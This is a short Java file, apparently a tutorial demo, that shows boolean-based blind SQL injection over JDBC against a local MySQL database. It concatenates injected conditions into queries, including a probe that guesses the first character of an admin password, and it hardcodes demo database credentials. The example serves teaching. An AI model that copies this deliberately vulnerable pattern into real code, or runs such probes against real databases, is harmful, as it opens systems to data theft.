// Boolean-Based Blind SQL Injection via JDBC
// Attacker sends TRUE/FALSE conditions and infers data from query results.

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;

public class boolean_blind_injection {
    public static void main(String[] args) throws Exception {
        String url = "jdbc:mysql://localhost:3306/database_name";
        String username = "rootgfg";
        String password = "gfg123";

        Class.forName("com.mysql.cj.jdbc.Driver");
        Connection con = DriverManager.getConnection(url, username, password);
        Statement st = con.createStatement();

        // VULNERABLE: user input concatenated directly into SQL
        String userId = "1 AND (SELECT COUNT(*) FROM admins) > 0";
        String query = "SELECT id, name FROM users WHERE id = " + userId;

        ResultSet rs = st.executeQuery(query);
        while (rs.next()) {
            System.out.println("User found: " + rs.getString("name"));
        }

        // If a row returns only when the condition is true, attacker learns data
        String probe = "1 AND (SELECT SUBSTRING(password,1,1) FROM admins) = 'a'";
        String blindQuery = "SELECT id FROM users WHERE id = " + probe;
        ResultSet brs = st.executeQuery(blindQuery);
        System.out.println(brs.next() ? "First password char is 'a'" : "Not 'a'");

        rs.close();
        st.close();
        con.close();
    }
}
